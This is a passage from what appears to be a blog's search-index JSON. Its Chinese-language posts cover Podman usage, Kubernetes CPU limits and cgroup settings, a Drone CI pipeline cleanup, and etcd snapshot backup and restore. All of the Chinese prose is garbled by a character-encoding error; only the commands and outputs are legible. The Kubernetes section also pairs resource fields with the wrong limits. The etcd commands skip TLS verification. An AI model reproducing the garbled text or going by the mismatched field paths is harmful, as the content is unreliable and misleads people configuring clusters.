æ”¾ç½®åˆ°å°æ‡‰çš„æª”æ¡ˆä¸­ï¼‰\n\næ¥ä¸‹ä¾†å°±å¯ä»¥çœ‹åˆ° Podman çš„ç‰ˆæœ¬è³‡è¨Šï¼š\n\n```\nClient:\nVersion:      3.4.1\nAPI Version:  3.4.1\nGo Version:   go1.17.2\nBuilt:        Wed Oct 20 05:14:42 2021\nOS/Arch:      darwin/amd64\n\nServer:\nVersion:      4.1.1\nAPI Version:  4.1.1\nGo Version:   go1.18.3\nBuilt:        Wed Jun 15 22:31:58 2022\nOS/Arch:      linux/amd64\n```\n\n## ä½¿ç”¨\n\næœå°‹ Imageï¼š\n\n`podman search busybox`\n\nä¾ç…§ output å¯ä»¥ç™¼ç¾é è¨­æ˜¯å»æœå°‹ docker hub (hub.docker.com)\n```\nINDEX       NAME                                         DESCRIPTION                                                                                STARS       OFFICIAL    AUTOMATED\ndocker.io   docker.io/library/busybox                    Busybox base image.                                                                        2660        [OK]\ndocker.io   docker.io/rancher/busybox                                                                                                               0\ndocker.io   docker.io/ibmcom/busybox                                                                                                                0\n......\n```\n\nä¸‹è¼‰ Image åˆ°æœ¬åœ°ï¼š\n\n`podman pull busybox`\n\nåŸ·è¡Œ busybox imageï¼š\n\n```\npodman run -it --rm busybox\n/ #\n/ #\n/ #\n/ # exit\n```\n\nä½¿ç”¨èµ·ä¾†èˆ‡ Docker ä¸¦ç„¡äºŒç•°\n\n## ç™¼ç¾\n\n### registries è¨­å®šæª”æ¡ˆ\n\næ•…æ„æ‹‰ä¸€å€‹ä¸å­˜åœ¨çš„ image\n\n`podman pull this-is-error`\n\n```\nResolving \"this-is-error\" using unqualified-search registries (/etc/containers/registries.conf.d/999-podman-machine.conf)\n```\n\næœƒç™¼ç¾ podman é€é `/etc/containers/registries.conf.d/999-podman-machine.conf` è¨­å®šä¾†æ±ºå®šå®Œæ•´çš„ Image åç¨±ï¼ˆå› ç‚ºæ²’æœ‰æŒ‡å®š registry ç†è«–ä¸Šç„¡æ³•å®šä½è©² Image ä½ç½®ï¼‰\n\nåˆ° VM ä¸­æª¢æŸ¥ä¸€ä¸‹è©²æª”æ¡ˆï¼Œå°±å¯ä»¥ç™¼ç¾åŸä¾†æ˜¯é è¨­æ‰¾ä¸åˆ° image å°±å» `docker.io` æ‰¾\n\n```\nâ¯ podman machine ssh\nConnecting to vm podman-machine-default. To close connection, use `~.` or `exit`\nWarning: Permanently added '[localhost.nctu.edu.tw]:52568' (ED25519) to the list of known hosts.\nFedora CoreOS 36.20220703.2.1\nTracker: https://github.com/coreos/fedora-coreos-tracker\nDiscuss: https://discussion.fedoraproject.org/tag/coreos\n\nLast login: Thu Jul  7 01:50:15 2022 from 192.168.127.1\n[core@localhost ~]$ cat /etc/containers/registries.conf.d/999-podman-machine.conf\nunqualified-search-registries=[\"docker.io\"]\n[core@localhost ~]$\n```\n\nå¦å¤–ä¹Ÿç™¼ç¾å…¶ä»– registries çš„è¨­å®šæª”\n\n```\n[core@localhost containers]$ cd /etc/containers/registries.conf.d\n[core@localhost registries.conf.d]$ ls\n000-shortnames.conf  999-podman-machine.conf\n[core@localhost registries.conf.d]$ cat 000-shortnames.conf\n[aliases]\n  # almalinux\n  \"almalinux\" = \"docker.io/library/almalinux\"\n  \"almalinux-minimal\" = \"docker.io/library/almalinux-minimal\"\n  # Arch Linux\n  \"archlinux\" = \"docker.io/archlinux/archlinux\"\n  # centos\n  \"centos\" = \"quay.io/centos/centos\"\n  # containers\n  \"skopeo\" = \"quay.io/skopeo/stable\"\n  \"buildah\" = \"quay.io/buildah/stable\"\n  \"podman\" = \"quay.io/podman/stable\"\n  \"hello\" = \"quay.io/podman/hello\"\n  \"hello-world\" = \"quay.io/podman/hello\"\n  # docker\n  \"alpine\" = \"docker.io/library/alpine\"\n  \"docker\" = \"docker.io/library/docker\"\n  \"registry\" = \"docker.io/library/registry\"\n  \"swarm\" = \"docker.io/library/swarm\"\n```\n\nå¯ä»¥ç™¼ç¾åŸä¾†æœ‰äº› image æ˜¯é€é alias çš„æ–¹å¼ä¾†æ±ºå®šä½ç½®çš„\n\n### Port Forward é¡¯ç¤ºä¸æ­£å¸¸\n\n```\nâ¯ podman run -itd -p 8888:80 nginx\nbe5cb3e60f7b714e3b9c3462610675dd8cc7eaf0c048cdef7c3c8ea011979096\n\nâ¯ podman run -itd -P nginx\n9a2adbd0e86c0083ad0af5bccedc7f5dbaa3b64599c982368f8e64b301eac25d\n\nâ¯ podman ps\nCONTAINER ID  IMAGE                           COMMAND               CREATED         STATUS             PORTS             NAMES\nbe5cb3e60f7b  docker.io/library/nginx:latest  nginx -g daemon o...  17 seconds ago  Up 18 seconds ago  0.0.0.0:0->0/tcp  unruffled_bouman\n9a2adbd0e86c  docker.io/library/nginx:latest  nginx -g daemon o...  3 seconds ago   Up 4 seconds ago   0.0.0.0:0->0/tcp  laughing_wiles\n```\n\nåœ¨ `podman ps` ä¸­çœ‹ä¸åˆ°è¢« binding å‡ºä¾†çš„ Ports æœ‰äº›ä¸æ–¹ä¾¿\n\nä¸éé€é `podman inspect` é‚„æ˜¯æ‰¾å¾—å‡ºä¾†\n\n```\nâ¯ podman inspect be5cb3e60f7b | grep -A5 \"PortBindings\"\n            \"PortBindings\": {\n                \"80/tcp\": [\n                    {\n                        \"HostIp\": \"\",\n                        \"HostPort\": \"8888\"\n                    }\n\nâ¯ podman inspect 9a2adbd0e86c | grep -A5 \"PortBindings\"\n            \"PortBindings\": {\n                \"80/tcp\": [\n                    {\n                        \"HostIp\": \"\",\n                        \"HostPort\": \"45521\"\n                    }\n```\n\nè‡³æ–¼ä¸€äº›è¤‡é›œçš„ç”¨æ³•æš«æ™‚é‚„æ²’æœ‰æ¸¬è©¦éï¼Œä¹Ÿä¸ç¢ºå®šå·®ç•°æ˜¯å¦å¾ˆå¤§\n\næˆ‘æƒ³æœ€å¤§çš„å·®ç•°å¯èƒ½é‚„æ˜¯æœƒåœ¨ networking çš„éƒ¨åˆ†ï¼ŒPodman å®˜æ–¹ä¹Ÿæœ‰çµ¦å‡º[ä¸€é ä»‹ç´¹](https://github.com/containers/podman/blob/main/docs/tutorials/basic_networking.md)ä¾†èªªæ˜ Podman çš„ç¶²è·¯æ¶æ§‹\n\né€™éƒ¨åˆ†å°±ç­‰åˆ°æœ‰æ™‚é–“ç ”ç©¶å®Œä¹‹å¾Œå†ä¾†è£œä¸Šä½¿ç”¨å¿ƒå¾—äº† ğŸ˜…\n\n","tags":["podman","container"]},{"title":"ç†è§£ Kubernetes ä¸­çš„ CPU Limit","url":"/2021/12/13/","content":"\n\n## TL;DR\n\nKubernetes ä¸­çš„è³‡æºé™åˆ¶ç›®å‰å¯ä»¥å°å…©ç¨®è³‡æºåšé™åˆ¶ï¼Œåˆ†åˆ¥ç‚º `cpu`ï¼ˆå¯å£“ç¸®è³‡æºï¼‰, `memory`ï¼ˆä¸å¯å£“ç¸®è³‡æºï¼‰ã€‚é‡å°é€™å…©ç¨®è³‡æºçš„é™åˆ¶å¯ä»¥å°æ‡‰åˆ°å…©ç¨®é™åˆ¶ï¼Œåˆ†åˆ¥ç‚º Soft Limitï¼ˆrequestï¼‰èˆ‡ Hard Limitï¼ˆlimitï¼‰\n\ncgroup å°æ–¼é€™å…©ç¨®è³‡æºé”åˆ° Hard Limit çš„è™•ç†ä¸¦ä¸ç›¸åŒã€‚è¨˜æ†¶é«”è¶…å‡º Hard Limit æœƒè§¸ç™¼ OOMï¼›CPU è¶…å‡º Hard Limit å‰‡æ˜¯æœƒé€ æˆ CPU Throttlingï¼ˆç¨‹å¼ä¸¦ä¸æœƒè¢«çµ‚æ­¢ï¼‰\n\nåœ¨ Cgroup ä¸­ä½¿ç”¨é‡å° K8s Pod yaml æ‰€å®šç¾©ä¹‹ Soft Limitï¼š\n\n```\nspec.containers[].resources.requests.memory\n```\n\næœƒè®“ Cgroup è¨­å®šç³»çµ±ä¹‹ `cpu.shares` åƒæ•¸\n\nè€Œ Hard Limitï¼š\n\n```\nspec.containers[].resources.requests.cpu\n```\n\næœƒè®“ Cgroup è¨­å®šç³»çµ±ä¹‹ `cpu.cfs_period_us`, `cpu.cfs_quota_us` åƒæ•¸\n\n## cpu.shares\n\nç•¶æˆ‘å€‘åœ¨ Pod ä¹‹ yaml ä¸­å®šç¾© `spec.containers[].resources.requests.cpu`ï¼š\n\n```yaml\nspec:\n  containers:\n  - name: busybox\n    image: hwchiu/netutils\n    args:\n    - sleep\n    - infinity\n    resources:\n      requests:\n        cpu: \"500m\"\n```\n\nå¯ä»¥å¾å°æ‡‰ç¯€é»çš„è·¯å¾‘ç™¼ç¾å„ç¨® cgroup åƒæ•¸\n\n`/sys/fs/cgroup/cpu,cpuacct/kubepods.slice/kubepods-burstable.slice/kubepods-burstable-pod<Pod-uid>.slice`\n\n(å› ç‚ºåªæœ‰è¨­å®š request æ‰€ä»¥æ˜¯é€²å…¥ burstable ç›®éŒ„ï¼Œé—œæ–¼ Pod QoS å¯ä»¥åƒè€ƒ Kubernetes å®˜æ–¹æ–‡ä»¶)\n\næ­¤æ™‚å¯ä»¥ç™¼ç¾\n\næª”æ¡ˆï¼šcpu.cfs_quota_us çš„å…§å®¹ç‚º `-1`ï¼ˆå› ç‚ºæ²’æœ‰è¨­å®š Hard Limitï¼Œ-1 ä»£è¡¨ä¸å—é™åˆ¶ï¼‰ï¼Œè€Œ cpu.shares çš„å…§å®¹ç‚º `512`ï¼ˆèˆ‡è¨­å®šçš„ 500m ä¸ç›¸åŒæ˜¯å› ç‚º cgroup ä»¥ 1024 ç‚ºåº•ï¼Œyaml ä»¥ 1000 ç‚ºåº•ï¼‰\n\nè€Œé€™å€‹ 512 æœƒè®“è©² Podï¼ˆä»¥ä¸‹ç¨±ç‚º Pod Aï¼‰å…·æœ‰\n\n512 / (512 + Other Pod cpu.shares) çš„ CPU ä½¿ç”¨æ™‚é–“\n\nå‡è¨­å¢é›†ä¸­åªæœ‰å…©å€‹ Podï¼Œå¦å¤–ä¸€å€‹ Pod çš„ cpu.shares ç‚º 1024\n\nå‰‡ Pod A çš„ä½¿ç”¨æ™‚é–“æœ‰\n\n512/(512 + 1024) = 33%\n\né€™ç¨®ç›¸å°çš„è¨­å®šæ–¹å¼å¾ˆæ˜é¡¯çš„å¯ä»¥ç™¼ç¾ä¸¦æ²’æœ‰è¾¦æ³•å¯¦è³ªæ§åˆ¶ Pod åœ¨ CPU çš„æ™‚é–“åˆ†é…\n\n## cpu.cfs_quota_us\n\nç„¶è€Œå¦‚æœè¨­å®šçš„ Pod yaml ç‚ºï¼š\n\n```yaml\n    resources:\n      requests:\n        cpu: \"500m\"\n      limits:\n        cpu: \"900m\"\n```\n\nå¯ä»¥ç™¼ç¾ cpu.cfs_period_us çš„å€¼ç‚º `100000`ï¼Œä»¥åŠ cpu.cfs_quota_us çš„å€¼ç‚º `90000`\n\n100000 çš„å«ç¾©ä»£è¡¨ CPU ä¸€å€‹é€±æœŸï¼Œä¹Ÿå°±æ˜¯ 1/10 ç§’ï¼ˆ100000 å¾®ç§’ï¼‰\n\n90000 ä»£è¡¨åœ¨é€™å€‹é€±æœŸå…§ï¼Œè©² Pod æœ€é«˜å¯ä»¥ä½¿ç”¨çš„æ™‚é–“ç‚º 90000 å¾®ç§’ï¼Œä¹Ÿå°±æ˜¯ yaml ä¸­è¨­å®šçš„ 900m\n\næ›å¥èªªè©±ï¼Œå¦‚æœæˆ‘å€‘è¦è®“ Pod åœ¨ä¸€å€‹ CPU é€±æœŸå¯ä»¥å®Œå…¨è·‘æ»¿ï¼Œé‚£å°±è¦è¨­å®š 1000m\n\nå¦‚æœä½¿ç”¨åˆ°ä¸Šé™ï¼Œç¨‹å¼é‚„æ²’çµæŸï¼Œè©² CPU é€±æœŸå…§çš„è©²ç¨‹å¼å°±æœƒè¢« Throttlingï¼Œç•™åˆ°ä¸‹ä¸€å€‹é€±æœŸæ‰èƒ½ç¹¼çºŒåŸ·è¡Œ\n\nä½†æ˜¯ä¸€ä½†è¨­å®šäº† Hard Limit åŒæ™‚ä»£è¡¨ç³»çµ±ä¸Šçš„ CPU ä¸å¿™ç¢Œï¼Œè©² Pod ä¹Ÿç„¡æ³•ä½¿ç”¨æ›´å¤šçš„ CPU æ™‚é–“\n\n## åƒè€ƒè³‡æ–™\n\n- [Throttling: New Developments in Application Performance with CPU Limits - Dave Chiluk, Indeed](https://www.youtube.com/watch?v=UE7QX98-kO0)\n- [k8s CPU limit å’Œ throttling çš„è¿·æ€](https://zhuanlan.zhihu.com/p/433065108)","tags":["Kubernetes","cgroup"]},{"title":"ä¸€æ¬¡ CI/CD èª¿æ•™ç¶“é©—","url":"/2021/11/07/","content":"\n## å‰è¨€\n\næœ€è¿‘å—æœ‹å‹å§”è¨—ï¼Œå”åŠ©æ”¹å–„äº†ä¸€å€‹ç¾æœ‰çš„ CI/CD Pipeline æµç¨‹ã€‚å°æ–¹çš„å°ˆæ¡ˆä¸»è¦æ˜¯ä¸€ç¾¤ç†Ÿæ‚‰è»Ÿé«”çš„è¨­è¨ˆçš„é–‹ç™¼è€…æ‰€é–‹ç™¼ï¼Œä½†åœ˜éšŠä¸­ä¸¦æ²’æœ‰äººå°æ–¼ç¶­è­· Pipeline æœ‰ç›¸é—œç¶“é©—ï¼Œæ–¼æ˜¯æˆ‘æ¥ä¸‹ä»»å‹™ï¼Œä¸€æ–¹é¢ä¹Ÿæƒ³çœ‹ä¸€ä¸‹åœ¨èª¿æ•™å‰èˆ‡èª¿æ•™ä¹‹å¾Œå¯ä»¥å¾—åˆ°å¤šå¤§çš„æ•ˆç›Šæå‡ã€‚å°æ–¼ä¸€å€‹æ²’æœ‰é–‹ç™¼è©²å°ˆæ¡ˆçš„äººä¾†èªªï¼Œæœ€å¿«äº†è§£å°ˆæ¡ˆæ•´é«”çš„æ•´åˆèˆ‡éƒ¨ç½²æµç¨‹çš„æ–¹å¼å°±æ˜¯ç›´æ¥å»çœ‹ç¾æœ‰çš„ Pipelineã€‚æ–¼æ˜¯æˆ‘æ‰“ç®—å¾æª¢è¦– Pipeline é–‹å§‹ä¸‹æ‰‹ï¼Œçœ‹æœ‰å“ªäº›åœ°æ–¹å¯ä»¥æ”¹è‰¯ã€‚\n\n## Runner çš„é¸æ“‡\n\nå°æ–¹ç•¶æ™‚ç‚ºäº†å¿«é€Ÿå°‡ Pipeline æ­å»ºä¸Šç·šï¼Œæ‰€ä»¥åœ¨é¸æ“‡ Runner çš„æ™‚å€™é¸æ“‡äº†ä¸€å€‹æœ€å¿«é€Ÿï¼ˆä½†å¯èƒ½ä¸å®‰å…¨ï¼‰çš„ Runnerï¼Œä¹Ÿå°±æ˜¯ Exec Runnerï¼ˆå°æ–¹æ¡ç”¨çš„ CI å·¥å…·ç‚º Drone CI ï¼‰ã€‚ç„¶è€Œå› ç‚ºç§»æ¤æ€§çš„é—œä¿‚ï¼Œæˆ‘å€‘éƒ½æœƒå¸Œæœ›è‡ªå·±çš„ Pipeline ç’°å¢ƒå¯ä»¥è·‘åœ¨å®¹å™¨ä¹‹ä¸­ï¼Œæ–¹ä¾¿å¾ŒçºŒçš„é·ç§»ä»¥åŠä¸è€¦åˆæ–¼ç‰¹å®šä½œæ¥­ç³»çµ±ã€‚æ–¼æ˜¯æˆ‘å°‡å°æ–¹ä¼ºæœå™¨ä¸Šçš„ Runner é‡æ–°æ¶è¨­äº† Docker Runnerï¼Œä¸¦ä¸”å°‡åŸæœ‰çš„ `.drone.yml` è¨­å®šæª”ç”± Exec Runner å½¢å¼è½‰æ›æˆ Docker Runnerï¼Œçµæœé¦¬ä¸Šé‡åˆ°äº†ç¬¬ä¸€å€‹å•é¡Œ\n\n> åŸæœ¬çš„ CI æ•´åˆæ¸¬è©¦çš„æ™‚é–“ç”± 2 åˆ†é˜ç›´æ¥è®Šæˆäº† 8 åˆ†é˜ã€‚\n\nç¶“éå¾ŒçºŒçš„æ’æŸ¥æ‰ç™¼ç¾åŸä¾†å°æ–¹çš„ Exec Runner åœ¨åŸ·è¡Œ Maven æ‰“åŒ…æ™‚ï¼Œå› ç‚ºæ˜¯ç›´æ¥åœ¨ä½œæ¥­ç³»çµ±ä¸Šé–‹å•Ÿ Process ä¾†è™•ç†ï¼Œæ‰€ä»¥æ¯ä¸€æ¬¡åŸ·è¡Œéƒ½æ˜¯ä¸€æ¨£çš„ç’°å¢ƒï¼Œé€ æˆå¾ŒçºŒé€²è¡Œæ‰“åŒ…çš„æ™‚å€™éƒ½æ˜¯å…±ç”¨ `/root/.m2/repository` è£¡é¢çš„å¥—ä»¶ï¼Œé€ æˆæ¯ä¸€æ¬¡ CI å…¶å¯¦éƒ½åœ¨å¿«å–ä¹‹å‰ç”¨éçš„å¥—ä»¶ï¼Œä¸¦ä¸æ˜¯å®Œå…¨ä¹¾æ·¨çš„ç’°å¢ƒã€‚è‹¥ä½¿ç”¨ Docker Runnerï¼Œä¹Ÿæƒ³è¦é¡ä¼¼çš„å¿«å–è¡Œç‚ºï¼Œå°±åªèƒ½é€éå…±äº«ç‰¹å®š host ä¸Šçš„ç›®éŒ„ä¾†é”æˆï¼Œåœ¨ DroneCI ä¸­æ­¤é¡çš„è¨­å®šä¹Ÿæ˜¯éå¸¸å¥½æ’°å¯«ã€‚\n\n## Docker in Docker\n\næ¥ä¸‹ä¾†é€™å€‹å•é¡Œå¹¾ä¹æ˜¯æ‰€æœ‰ CI/CD å¹³å° çš„ Docker Runner éƒ½æœƒé‡åˆ°çš„å•é¡Œã€‚å¦‚ä½•åœ¨ CI/CD Stage ä¸­ä½¿ç”¨ Docker æŒ‡ä»¤ä¾†å»ºæ§‹ Docker Imageï¼Ÿé€™å€‹å•é¡Œçš„è§£æ³•å¤§è‡´ä¸Šå¯åˆ†ç‚ºå…©ç¨®ï¼ˆDinD èˆ‡ DooDï¼‰ã€‚ç„¶è€Œæœ€å¿«çš„æ–¹æ³•æ˜¯ç›´æ¥å°‡ `/var/run/docker.sock` æ›è¼‰æ–¼ Stage çš„ Container ä¸­ï¼Œä¾†é”åˆ°å¯ä»¥åœ¨å®¹å™¨ä¹‹ä¸­é€é UNIX Sock èˆ‡ host ä¸Šçš„ Docker Engine æºé€šï¼ˆç•¶ç„¶é‚„è¦æœ‰ docker cliï¼‰ã€‚å¯¦éš›ä¸Šåœ¨åŸ·è¡Œ Pipeline æ™‚ï¼Œç™¼ç¾åœ¨å°æ–¹å°ˆæ¡ˆä¸­çš„ testcontainer åœ¨é€²è¡Œæ•´åˆæ¸¬è©¦æ™‚ï¼Œå˜—è©¦å»é€£ç·šè‡ªå·±ï¼ˆMaven ä¸­çš„ testcontainerï¼‰æ‰€å»ºç«‹å‡ºä¾† testcontainers/ryuk å®¹å™¨ï¼Œä¸¦ä¸”å› ç‚ºç„¡æ³•æ­£å¸¸é€£ç·šè‡³è©²å®¹å™¨è€Œå°è‡´éŒ¯èª¤ã€‚å¾Œä¾†æŸ¥çœ‹äº†ç³»çµ±ç’°å¢ƒæ‰ç™¼ç¾å°æ–¹ Runner çš„æ©Ÿå™¨ä¸Šä½¿ç”¨ ufw å»ç®¡ç†é˜²ç«ç‰†\n\n> ufw æœƒå°‡ iptables ä¸­çš„ INPUT chain (filter table) Policy æ”¹æˆ DROP\n\né€ æˆ Drone CI Stage ä¸­çš„ Container ç„¡æ³•æ­£å¸¸å­˜å–å…¶ä»– Containerï¼Œä¸»è¦å› ç‚º Drone CI å› ç‚ºå®‰å…¨åŸå› æ‰€ä»¥å°‡é€™äº› Stage é–‹å‡ºä¾†çš„ Container éƒ½æ”¾åœ¨ç¨ç«‹çš„ Linux Bridge ä¹‹ä¸‹ï¼Œè€Œä¸æ˜¯é è¨­çš„ docker0ï¼Œé€™æ™‚å€™è·¨ä»‹é¢çš„é€šè¨Šæœƒå› ç‚º iptables è¦å‰‡è€Œè¢«æ“‹ä¸‹ï¼ˆç•¶æ™‚ ufw ç‚ºé–‹å•Ÿç‹€æ…‹ï¼‰ã€‚\n\n## latest tag é€ æˆçš„éš±å«è¡Œç‚º\n\nå°‡ Pipeline æ•´ç†å¾—å·®ä¸å¤šæ™‚ï¼Œç™¼ç¾åœ¨ CD éšæ®µæ™‚çš„åŸºç¤è¨­æ–½éƒ½æ˜¯ç”¨ docker-compose åŸ·è¡Œï¼Œå¯æ˜¯é€™äº› Image ä¸¦æ²’æœ‰æŒ‡å®š Image tagï¼ˆé è¨­æ¡ç”¨ latestï¼‰ã€‚æ–¼æ˜¯ä½¿ç”¨äº† docker images æŒ‡ä»¤ç™¼ç¾é€™äº› Image éƒ½æ˜¯åœ¨æ•¸å€‹æœˆä¹‹å‰è¢«æ‹‰åˆ°æœ¬åœ°ç«¯çš„ï¼Œç„¡æ³•å¾—çŸ¥ç•¶æ™‚ç‰ˆæœ¬ï¼Œä¹Ÿå°±æ²’è¾¦æ³•æŒ‡å®šç‰¹å®šç‰ˆæœ¬ä¾†ç¶­æŒå°ˆæ¡ˆçš„ç§»æ¤æ€§ã€‚ä½¿ç”¨ Image çš„ id åœ¨ docker hub ä¸Šé¢æœå°‹å¯èƒ½æ˜¯ä¸€å€‹è¾¦æ³•ï¼Œä½†æ˜¯ docker hub ä¸¦æ²’æœ‰æä¾›è®“ç”¨æˆ¶ç›´æ¥ç”¨ Image id ä¾†æœå°‹çš„æ–¹å¼ã€‚åœ¨ç¶²è·¯ä¸Šæ‰¾äº†ä¸€äº›å·¥å…·ä¹Ÿæ²’æœ‰è§£æ±ºæƒ³çŸ¥é“é€™äº› Image åˆ°åº•æ˜¯å“ªä¸€å€‹ç‰ˆæœ¬çš„å•é¡Œã€‚åœ¨æœ€å¾Œä½¿ç”¨ docker inspect æ™‚ç„¡æ„é–“çœ‹åˆ°\n\n> ContainerConfig æ¬„ä½ï¼Œå…¶ä¸­çš„ Env æ¬„ä½ä¸­æœ‰æ‡‰ç”¨ç¨‹å¼çš„ç‰ˆæœ¬è³‡è¨Š\n\né›–ç„¶æ²’æœ‰è¾¦æ³•å®Œå…¨çŸ¥é“ Image çš„ tagï¼Œä½†æ˜¯çŸ¥é“ Image ä¸­æ‡‰ç”¨ç¨‹å¼çš„ç‰ˆæœ¬ä¹Ÿå¯ä»¥æ–¹ä¾¿ä½¿ç”¨é€™äº›ç‰ˆæœ¬ä¾†é€²è¡Œæ¸¬è©¦ï¼Œæ¸¬è©¦æ²’å•é¡Œå¾Œå°±å°‡é€™äº›ç‰ˆæœ¬éƒ½å›ºå®šï¼Œé¿å…æ—¥å¾Œè½‰ç§»æ™‚å› ç‚º latest æ¨™ç±¤è€Œç„¡æ³•ç¢ºå®šç‰ˆæœ¬\bã€‚\n\n## å¾Œè¨˜\n\né€™ç¯‡ç‚ºé€™å¹¾å¤©æœ€ä½³åŒ– Pipeline å¾Œçš„ç´€éŒ„å°ç¸½çµï¼Œåœ¨å°‡é€™äº›åˆæ­¥çš„æœ€ä½³åŒ–å®Œæˆä¹‹å¾Œã€‚ä¹‹å¾Œå‰‡æœƒé€²è¡Œä¸€äº›è¨­è¨ˆæ–¹å‘çš„æœ€ä½³åŒ–ï¼ŒåŒ…å«\n\n- å¦‚ä½•è¦åŠƒå¿«å–æ‰å¯ä»¥åŠ é€Ÿæµç¨‹ä½†ä¸å¸Œæœ›å› æ­¤è€Œé€ æˆæ¸¬è©¦ä¸ä¹¾æ·¨\n- å¦‚ä½•è¨­è¨ˆä¸€å€‹å¯ä»¥åœ¨ monorepo çš„å°ˆæ¡ˆä¸­ï¼Œä¸ç”¨å› ç‚ºæ”¹äº† Aï¼Œå°±å°‡å…¨éƒ¨çš„å¾®æœå‹™ï¼ˆA, B, Cï¼‰é‡æ–°æ‰“åŒ…\n- ä½¿å¦éœ€è¦ä¸€å€‹å„²å­˜æ•æ„Ÿè³‡è¨Šçš„å€åŸŸï¼Œè®“å¤šå€‹ Runner åœ¨éƒ¨ç½²æ™‚å¯ä»¥å»æ‹‰å–è³‡è¨Šï¼ˆè€Œä¸é€é host å…±äº«æª”æ¡ˆï¼‰\n","tags":["CI/CD","Docker","DroneCI"]},{"title":"å¦‚ä½•å‚™ä»½ Kubernetes ä¸­çš„ etcd","url":"/2021/05/21/","content":"\n## åºè¨€\n\nKubernetes ä¸­çš„ç‹€æ…‹éƒ½æ˜¯ç”¨ etcd é€™å¥— key-value å„²å­˜å·¥å…·ä¾†ç¶­æŒï¼Œä¹Ÿå°±æ˜¯èªªæˆ‘å€‘åªè¦å‚™ä»½å¥½ etcd å¾Œï¼Œå°±å¯ä»¥å¾ˆè¼•æ˜“çš„é‡å»ºä¸€å€‹ä¸€æ¨¡ä¸€æ¨£çš„ Cluster èµ·ä¾†ã€‚\n\nè¦å‚™ä»½ etcd å¯ä»¥ä½¿ç”¨ etcdctl é€™å¥— cli å·¥å…·ä¾†ç°¡å–®å®Œæˆ\n\nå› ç‚º etcd åˆ†äº† v2, v3 å…©ç¨®ç‰ˆæœ¬ï¼Œå½¼æ­¤ä¸ç›¸å®¹ï¼Œæ‰€ä»¥åœ¨ä½¿ç”¨ cli å·¥å…·æ™‚éœ€è¦æŒ‡å®šç‰ˆæœ¬\n\nåœ¨æ“ä½œæ™‚ï¼Œæˆ‘å€‘æœƒéœ€è¦ cert ä½ç½®èˆ‡ key çš„ä½ç½®ï¼Œå¦‚æœä½ çš„ Cluster æ˜¯é€é kubeadm å®‰è£ï¼Œé‚£éº¼ä½ç½®éƒ½æœƒåœ¨ `/etc/kubernetes/pki/etcd` ä¸­\n\næˆ‘å€‘å¯ä»¥å…ˆé€é `etcdctl member list` ä¾†ç¢ºèªæ˜¯å¦å¯ä»¥æ­£ç¢ºé€£ç·šåˆ°æˆ‘å€‘çš„ etcd\n\nä»¥ä¸‹éƒ½å‡è¨­æˆ‘çš„ etcd ä½ç½®åœ¨ `10.10.10.10`\n\n\n```shell\nETCDCTL_API=3 etcdctl member list \\\n--endpoints https://10.10.10.10:2379 \\\n--cert=/etc/kubernetes/pki/etcd/server.crt \\\n--key=/etc/kubernetes/pki/etcd/server.key \\\n--insecure-skip-tls-verify\n```\n\nå¦‚æœè¦ºå¾—æŒ‡ä»¤å¤ªé•·çš„è©±ï¼Œetcdctl é è¨­æœƒå»åƒç’°å¢ƒè®Šæ•¸ï¼Œä¹Ÿå¯ä»¥åœ¨ç’°å¢ƒè®Šæ•¸ä¸­è¨­å®š\n\n```\nexport ETCDCTL_CERT_FILE='/etc/kubernetes/pki/etcd/server.crt'\nexport ETCDCTL_KEY_FILE='/etc/kubernetes/pki/etcd/server.key'\nexport ETCDCTL_ENDPOINTS='https://10.10.10.10:2379'\n```\n\nä¸ç¢ºå®šé€™äº›è³‡è¨Šåœ¨å“ªè£¡çš„è©±ï¼Œå¯ä»¥ç›´æ¥å»çœ‹ä½  etcd çš„ yaml å°±å¯ä»¥çœ‹åˆ°äº†ï¼Œé€™äº›è³‡è¨Šæœƒåœ¨ etcd çš„å•Ÿå‹•åƒæ•¸ä¸­\n\n## åŒ¯å‡º\n\nç¢ºèªå¯ä»¥é€£ç·šä¹‹å¾Œï¼Œæˆ‘å€‘å°‡ etcd çš„å…§å®¹å®Œæ•´çš„åŒ¯å‡ºï¼Œå‘½åç‚º `etcd-snapshot-$(date +%Y%m%d).db`\n\n```shell\nETCDCTL_API=3 etcdctl snapshot save /root/etcd-snapshot-$(date +%Y%m%d).db \\\n--endpoints https://10.10.10.10:2379 \\\n--cert=/etc/kubernetes/pki/etcd/server.crt \\\n--key=/etc/kubernetes/pki/etcd/server.key \\\n--insecure-skip-tls-verify\n```\n\noutput:\n```\nSnapshot saved at /root/etcd-snapshot-20210521.db\n```\n\n## åŒ¯å…¥\n\nåŒ¯å‡ºç›¸è¼ƒåŒ¯å‡ºéº»ç…©ä¸€äº›ï¼Œæˆ‘å€‘éœ€è¦å…ˆè®“ api-server èˆ‡ etcd éƒ½çµ‚æ­¢ï¼Œé‡æ–°å°‡ etcd çš„è³‡æ–™åŒ¯å…¥ä¹‹å¾Œå†é‡æ–°æ‰“é–‹å®ƒå€‘ã€‚\n\næˆ‘çš„ api-server èˆ‡ etcd éƒ½æ˜¯ä»¥ static pod çš„æ–¹å¼å­˜åœ¨ï¼Œæ‰€ä»¥åªè¦å°‡å°æ‡‰çš„ yaml æª”æ¡ˆæš«æ™‚ç§»é™¤ static pod ç›®éŒ„å³å¯\n\n```shell\nmv /etc/kubernetes/manifests/etcd.yaml /root/etcd.yaml\nmv /etc/kubernetes/manifests/kube-apiserver.yaml /root/kube-apiserver.yaml\n```\n\næ¥è‘—æˆ‘å€‘å°‡èˆŠçš„ etcd è³‡æ–™æš«æ™‚ç§»é–‹ï¼ˆåŒæ™‚é€²è¡Œå‚™ä»½ï¼‰\n\n```shell\nmv /var/lib/etcd/default.etcd /var/lib/etcd/default.etcd.bak\n```\n\nå°‡æ–°çš„å‰›æ‰åŒ¯å‡ºçš„ etcd è³‡æ–™é‡æ–°åŒ¯å…¥\n\n```shell\nETCDCTL_API=3 etcdctl snapshot restore /root/etcd-snapshot-20210521.db \\\n--name etcd-0 \\\n--initial-cluster \"etcd-0=https://10.10.10.10:2380\" \\\n--initial-cluster-token etcd-cluster \\\n--initial-advertise-peer-urls https://10.10.10.10:2380 \\\n--data-dir=/var/lib/etcd/default.etcd\n```\noutput:\n```\n2021-05-21 07:42:36.826573 I | mvcc: restore compact to 3969180\n2021-05-21 07:42:36.840090 I | etcdserver/membership: added member 9ce23f330769428b [https://10.10.10.10:2380] to cluster 457ee8b0c2eda630\n```\n\nåŒ¯å‡ºä¹‹å¾Œå†æŠŠ api-server èˆ‡ etcd é‡å•Ÿå°±å¯ä»¥äº†\n\n```\nmv /root/etcd.yaml /etc/kubernetes/manifests/etcd.yaml\nmv 